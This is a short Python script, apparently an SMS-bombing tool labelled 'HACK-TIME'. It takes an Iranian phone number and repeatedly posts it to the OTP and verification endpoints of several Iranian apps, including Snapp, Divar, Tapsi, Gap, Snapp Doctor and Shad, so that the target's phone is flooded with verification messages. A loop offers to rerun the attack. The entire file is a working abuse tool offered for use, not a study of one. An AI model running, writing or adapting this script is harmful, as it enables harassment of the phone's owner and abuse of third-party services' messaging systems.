import requests
import time
phone = input("Enter number:")

#	l = requests.post(site, data=fordata)

fordata = {"callphone":"+98"+phone}
snap = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
divar = "https://api.divar.ir/v5/auth/authenticate"
tapsi = "https://api.tapsi.cab/api/v2/user"
gap = "https://core.gap.im/v1/user/add.json?mobile=%2B98{}".format(phone)
shaypoor = "https://www.sheypoor.com/auth"
snapdr = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{}/sms?cCode=+98".format(phone)
bama = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{}/sms?cCode=+98".format(phone)
shad = "https://shadmessenger66.iranlms.ir/"
def Start():
    print("Create By:PARDOX_TEXER---M1778Cyber")
    print("HACK-TIME")
    time.sleep(10)

def Snap():
    requests.post(snap,fordata)
    requests.post(snap,fordata)

def Divar():
    requests.post(divar, fordata)
    requests.post(divar,fordata)


def Tapsi():
    requests.post(tapsi, fordata)
    requests.post(tapsi,fordata)

def Gap():
    requests.post(gap, fordata)
    requests.post(gap, fordata)

def Snapdr():
    requests.post(snapdr, fordata)
    requests.post(snapdr, fordata)

def Bama():
    requests.post(bama, fordata)
    requests.post(bama, fordata)

def Shad():
    requests.post(shad,fordata)
    requests.post(shad, fordata)


def main():
    Start()
    print("Start")
    time.sleep(1)
    Snap()
    print("Send")
    Divar()
    print("Send")
    time.sleep(5)
    Snapdr()
    print("Send")
    Bama()
    print("Send")
    Shad()
    print("Send")
    Gap()
    print("Send")
    Tapsi()
    print("Send")
    time.sleep(15)
    print("Task Complite")
    ag = input("Try Again(y, n):")
    if ag == "y":
        main()
    elif ag == "Y":
        main()
    elif ag == "N":
        print("Bye!")
        exit()
    else:
        print("Bye!")
        exit()
main()